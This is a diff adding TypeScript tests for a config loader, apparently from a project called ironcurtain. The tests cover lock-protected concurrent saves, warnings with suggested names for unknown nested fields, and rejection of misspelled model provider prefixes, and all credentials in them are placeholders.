+        import { existsSync, writeFileSync } from 'node:fs';
+        import { saveUserConfig } from ${JSON.stringify(moduleUrl)};
+        const [readyPath, goPath, writer, count] = process.argv.slice(1);
+        writeFileSync(readyPath, '');
+        while (!existsSync(goPath)) await new Promise((r) => setTimeout(r, 2));
+        for (let i = 0; i < Number(count); i++) {
+          saveUserConfig({ serverCredentials: { ['w' + writer + '-' + i]: { TOKEN: 'v' + writer + '-' + i } } });
+        }
+      `;
+      const writers = 4;
+      const savesEach = 12;
+      const signals = mkdtempSync(resolve(tmpdir(), 'ironcurtain-config-race-'));
+      try {
+        const goPath = resolve(signals, 'go');
+        const children = Array.from({ length: writers }, (_, writer) =>
+          runProgram(program, [resolve(signals, `ready-${writer}`), goPath, String(writer), String(savesEach)]),
+        );
+        await Promise.all(
+          Array.from({ length: writers }, (_, writer) => waitForFile(resolve(signals, `ready-${writer}`), 60_000)),
+        );
+        writeFileSync(goPath, '');
+        await Promise.all(children);
+      } finally {
+        rmSync(signals, { recursive: true, force: true });
+      }
+
+      const onDisk = JSON.parse(readFileSync(configPath, 'utf-8')) as {
+        anthropicApiKey: string;
+        serverCredentials: Record<string, { TOKEN: string }>;
+      };
+      expect(onDisk.anthropicApiKey).toBe('sk-ant-base');
+      const expected: Record<string, { TOKEN: string }> = {};
+      for (let writer = 0; writer < writers; writer++) {
+        for (let i = 0; i < savesEach; i++) expected[`w${writer}-${i}`] = { TOKEN: `v${writer}-${i}` };
+      }
+      expect(onDisk.serverCredentials).toEqual(expected);
+      expect(modeOf(configPath)).toBe(0o600);
+      expect(readdirSync(testHome).sort()).toEqual(['config.json', 'config.json.bak']);
+    }, 120_000);
+
+    it('a backfilling load does not roll back a save another process made while it waited', async () => {
+      writeFileSync(configPath, JSON.stringify({ agentModelId: 'anthropic:claude-sonnet-4-6' }, null, 2), {
+        mode: 0o600,
+      });
+      const savedByOther = `${JSON.stringify(
+        {
+          agentModelId: 'anthropic:claude-sonnet-4-6',
+          serverCredentials: { github: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_saved_meanwhile' } },
+        },
+        null,
+        2,
+      )}\n`;
+      const lockUrl = pathToFileURL(resolve(process.cwd(), 'src', 'util', 'file-lock.ts')).href;
+      // Holds the config lock, then writes a "save" while this process's load waits for the lock.
+      const program = `
+        import { writeFileSync } from 'node:fs';
+        import { withFileLockSync } from ${JSON.stringify(lockUrl)};
+        const [configPath, lockedPath, holdMs, content] = process.argv.slice(1);
+        withFileLockSync(configPath, () => {
+          writeFileSync(lockedPath, '');
+          Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, Number(holdMs));
+          writeFileSync(configPath, content);
+        });
+      `;
+      const lockedPath = resolve(testHome, '..', `${basename(testHome)}-locked`);
+      try {
+        const holder = runProgram(program, [configPath, lockedPath, '1500', savedByOther]);
+        await waitForFile(lockedPath, 60_000);
+
+        const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
+        let loaded: ReturnType<typeof loadUserConfig>;
+        try {
+          // Reads the file without the save, then waits for the lock to backfill.
+          loaded = loadUserConfig();
+        } finally {
+          stderrSpy.mockRestore();
+        }
+        await holder;
+
+        expect(loaded.serverCredentials).toEqual({ github: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_saved_meanwhile' } });
+        expect(JSON.parse(readFileSync(configPath, 'utf-8'))).toMatchObject({
+          serverCredentials: { github: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_saved_meanwhile' } },
+          statistics: USER_CONFIG_DEFAULTS.statistics,
+        });
+        expect(readFileSync(`${configPath}.bak`, 'utf-8')).toBe(savedByOther);
+      } finally {
+        rmSync(lockedPath, { force: true });
+      }
+    }, 60_000);
+  });
+});
+
+// --- Unknown nested config fields are reported, in every load mode ---
+
+describe('unknown config fields at any depth', () => {
+  let testHome: string;
+  const savedEnv: Record<string, string | undefined> = {};
+
+  beforeEach(() => {
+    testHome = mkdtempSync(resolve(tmpdir(), 'ironcurtain-unknownfields-'));
+    for (const key of ENV_VARS_TO_ISOLATE) {
+      savedEnv[key] = process.env[key];
+      delete process.env[key];
+    }
+    process.env.IRONCURTAIN_HOME = testHome;
+  });
+
+  afterEach(() => {
+    for (const key of ENV_VARS_TO_ISOLATE) {
+      if (savedEnv[key] !== undefined) process.env[key] = savedEnv[key];
+      else delete process.env[key];
+    }
+    rmSync(testHome, { recursive: true, force: true });
+  });
+
+  function writeConfig(config: Record<string, unknown>): void {
+    writeFileSync(resolve(testHome, 'config.json'), JSON.stringify(config, null, 2) + '\n', { mode: 0o600 });
+  }
+
+  /** Runs `fn` and returns everything it wrote to stderr. */
+  function stderrOf(fn: () => unknown): string {
+    const writes: string[] = [];
+    const spy = vi.spyOn(process.stderr, 'write').mockImplementation((chunk: string | Uint8Array) => {
+      writes.push(String(chunk));
+      return true;
+    });
+    try {
+      fn();
+    } finally {
+      spy.mockRestore();
+    }
+    return writes.join('');
+  }
+
+  // Regression: nested z.object() sections strip unknown keys, and only
+  // top-level keys were checked (and only in the default load mode), so a
+  // $0.50 / 5-step budget typo silently ran with the $5 / 200-step defaults.
+  it('warns about a resourceBudget typo and names the field it meant', () => {
+    writeConfig({ resourceBudget: { maxCostUsd: 0.5, maxStep: 5 }, dockerResources: { memoryMB: 2048 } });
+
+    let config: ReturnType<typeof loadUserConfig> | undefined;
+    const stderr = stderrOf(() => {
+      config = loadUserConfig();
+    });
+
+    expect(stderr).toContain('unknown field "resourceBudget.maxStep"');
+    expect(stderr).toContain('did you mean "resourceBudget.maxSteps"?');
+    expect(stderr).toContain('unknown field "resourceBudget.maxCostUsd"');
+    expect(stderr).toContain('unknown field "dockerResources.memoryMB"');
+    expect(stderr).toContain('did you mean "dockerResources.memoryMb"?');
+    // Still a warning, not an error: the defaults apply and the typos stay in the file.
+    expect(config?.resourceBudget.maxSteps).toBe(USER_CONFIG_DEFAULTS.resourceBudget.maxSteps);
+    const onDisk = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')) as {
+      resourceBudget: Record<string, unknown>;
+    };
+    expect(onDisk.resourceBudget.maxStep).toBe(5);
+  });
+
+  it('says so when the backfill fills a section none of whose keys was recognized', () => {
+    writeConfig({ resourceBudget: { maxCostUsd: 0.5, maxStep: 5 } });
+
+    const stderr = stderrOf(() => loadUserConfig());
+
+    expect(stderr).toMatch(
+      /Backfilled config fields: [^\n]*resourceBudget \(none of its keys is recognized: "maxCostUsd", "maxStep"\)/,
+    );
+  });
+
+  it('warns in read-only loads too, which never backfill', () => {
+    writeConfig({ resourceBudget: { maxStep: 5 } });
+
+    const stderr = stderrOf(() => loadUserConfig({ readOnly: true }));
+
+    expect(stderr).toContain('unknown field "resourceBudget.maxStep"');
+    expect(stderr).not.toContain('Backfilled');
+  });
+
+  // Workflows take their per-run limits from this loader, not loadUserConfig,
+  // so a typo there must be reported on this path as well.
+  it('warns from the per-run budget loader, which drops the mistyped limits', () => {
+    writeConfig({ resourceBudget: { maxCostUsd: 0.5, maxStep: 5 } });
+
+    let requested: ReturnType<typeof loadRequestedResourceBudgetConfig> | undefined;
+    const stderr = stderrOf(() => {
+      requested = loadRequestedResourceBudgetConfig();
+    });
+
+    expect(stderr).toContain('unknown field "resourceBudget.maxStep"');
+    expect(stderr).toContain('did you mean "resourceBudget.maxSteps"?');
+    expect(stderr).toContain('unknown field "resourceBudget.maxCostUsd"');
+    expect(requested).toEqual({});
+  });
+
+  // `setup-signal` reads the saved container block without a full load, so a
+  // mistyped key there must be reported on that path as well.
+  it('warns from the saved Signal container loader', () => {
+    writeConfig({ signal: { container: { prot: 18081 } } });
+
+    let saved: ReturnType<typeof loadSavedSignalContainerConfig>;
+    const stderr = stderrOf(() => {
+      saved = loadSavedSignalContainerConfig();
+    });
+
+    expect(stderr).toContain('unknown field "signal.container.prot"');
+    expect(stderr).toContain('did you mean "signal.container.port"?');
+    expect(saved).toEqual({});
+  });
+
+  it('reports each unknown field once per process, however often the config is loaded', () => {
+    writeConfig({ autoCompact: { enabld: false } });
+
+    const first = stderrOf(() => loadUserConfig({ readOnly: true }));
+    const again = stderrOf(() => {
+      loadUserConfig({ readOnly: true });
+      loadUserConfig();
+    });
+
+    expect(first).toContain('unknown field "autoCompact.enabld" in');
+    expect(first).toContain('did you mean "autoCompact.enabled"?');
+    expect(again).not.toContain('autoCompact.enabld');
+  });
+
+  it('reaches into provider profiles, model maps and other nested sections', () => {
+    const fields = findUnknownUserConfigFields({
+      modelProviders: {
+        profiles: {
+          'glm-5.2': {
+            type: 'openrouter',
+            apikey: 'sk-or-v1-x',
+            modelMap: [{ match: '*sonnet*', modle: 'z-ai/glm-5.3' }],
+            perAgent: { 'claude-code': 'z-ai/glm-5.3', cluade: 'x' },
+          },
+        },
+      },
+      signal: { container: { prot: 18080 } },
+      resourceBudget: { modelPricing: { 'claude-x': { inputPerMillion: 1, outputPerMillion: 2 } } },
+      topLevelTypo: true,
+    });
+
+    expect(fields).toEqual([
+      { field: 'modelProviders.profiles["glm-5.2"].apikey', suggestion: 'modelProviders.profiles["glm-5.2"].apiKey' },
+      {
+        field: 'modelProviders.profiles["glm-5.2"].modelMap[0].modle',
+        suggestion: 'modelProviders.profiles["glm-5.2"].modelMap[0].model',
+      },
+      { field: 'modelProviders.profiles["glm-5.2"].perAgent.cluade' },
+      { field: 'signal.container.prot', suggestion: 'signal.container.port' },
+      { field: 'topLevelTypo' },
+    ]);
+  });
+
+  it('does not flag the keys of free-form records or a complete, valid config', () => {
+    const valid = {
+      agentModelId: USER_CONFIG_DEFAULTS.agentModelId,
+      resourceBudget: {
+        ...USER_CONFIG_DEFAULTS.resourceBudget,
+        modelPricing: { 'anthropic:claude-x': { inputPerMillion: 3, outputPerMillion: 15, cacheReadPerMillion: 0.3 } },
+      },
+      autoCompact: USER_CONFIG_DEFAULTS.autoCompact,
+      autoApprove: USER_CONFIG_DEFAULTS.autoApprove,
+      auditRedaction: USER_CONFIG_DEFAULTS.auditRedaction,
+      dockerResources: USER_CONFIG_DEFAULTS.dockerResources,
+      snapshot: USER_CONFIG_DEFAULTS.snapshot,
+      statistics: USER_CONFIG_DEFAULTS.statistics,
+      preferredMode: 'docker',
+      serverCredentials: { github: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_x' }, anything: { ANY_NAME: 'v' } },
+      webSearch: { provider: 'brave', brave: { apiKey: 'k' } },
+      hostModelProfiles: { agent: 'native' },
+      modelProviders: {
+        default: 'glm',
+        profiles: {
+          glm: { type: 'openrouter', modelMap: [{ match: '*', model: 'z-ai/glm-5.3' }], sessionAffinity: true },
+          zai: { type: 'zai', plan: 'coding', model: 'glm-5.3' },
+        },
+      },
+      credentialProtection: { extraPaths: ['~/.secret'], disabledStores: [] },
+      packageInstall: { enabled: true, allowedPackages: ['left-pad'] },
+      fetch: { allowPrivateNetworks: false },
+      capture: { enabled: false },
+      memory: { enabled: true, autoSave: false, llmBaseUrl: 'https://llm.example.com/v1', llmApiKey: 'k' },
+      observability: { llmInteractionLog: 'metadata' },
+      taintEscalation: { enabled: true, tools: { 'github/*': 'sink', 'fetch/http_fetch': 'source' } },
+      contentAssessment: { enabled: true, llmCheck: true, llmModelId: 'anthropic:claude-haiku-4-5' },
+      policy: { onStale: 'refuse' },
+      egressPolicy: { enabled: true, allowedHosts: ['*.example.com'] },
+      cron: { maxConcurrentRuns: 2, catchUpMissedRuns: true },
+      maxConcurrentAgentSessions: 2,
+    };
+    expect(userConfigSchema.safeParse(valid).success).toBe(true);
+    expect(findUnknownUserConfigFields(valid)).toEqual([]);
+  });
+
+  it('recognizes every field the backfill writes', () => {
+    expect(findUnknownUserConfigFields(USER_CONFIG_DEFAULTS)).toEqual([]);
+  });
+});
+
+// --- Model IDs: near-miss provider prefixes are refused ---
+
+describe('model ID provider near misses', () => {
+  // Regression: the loose validator (workflow YAML) accepted "opnai:gpt-5" and
+  // routed it to Anthropic as an opaque model name.
+  it.each(['anthropc:claude-x', 'opnai:gpt-5', 'opneai:gpt-5', 'gogle:gemini-2.5-flash', 'Anthropic:claude-x'])(
+    'rejects %s in workflow (loose) and config (strict) validation, naming the provider',
+    (id) => {
+      const loose = looseModelId.safeParse(id);
+      expect(loose.success).toBe(false);
+      expect(loose.error?.issues[0]?.message).toMatch(/did you mean "(anthropic|openai|google)"\?/);
+      expect(qualifiedModelId.safeParse(id).success).toBe(false);
+      expect(validateWorkflowModelId(id)).toMatch(/Unknown model provider/);
+    },
+  );
+
+  it('suggests the provider the prefix is closest to', () => {
+    expect(validateWorkflowModelId('anthropc:claude-x')).toContain('did you mean "anthropic"?');
+    expect(validateModelId('opnai:gpt-5')).toContain('did you mean "openai"?');
+  });
+
+  it('still accepts Ollama-style name:tag IDs and other unknown prefixes in workflows', () => {
+    for (const id of ['glm-5.1:cloud', 'qwen3.5-uncensored:35b', 'llama3:8b', 'gemma2:2b', 'unknown:model-id']) {
+      expect(looseModelId.safeParse(id).success, id).toBe(true);
+      expect(validateWorkflowModelId(id), id).toBeUndefined();
+    }
+    expect(validateWorkflowModelId('openai:gpt-5')).toBeUndefined();
+    expect(validateWorkflowModelId(':tag')).toBeDefined();
   });
 });
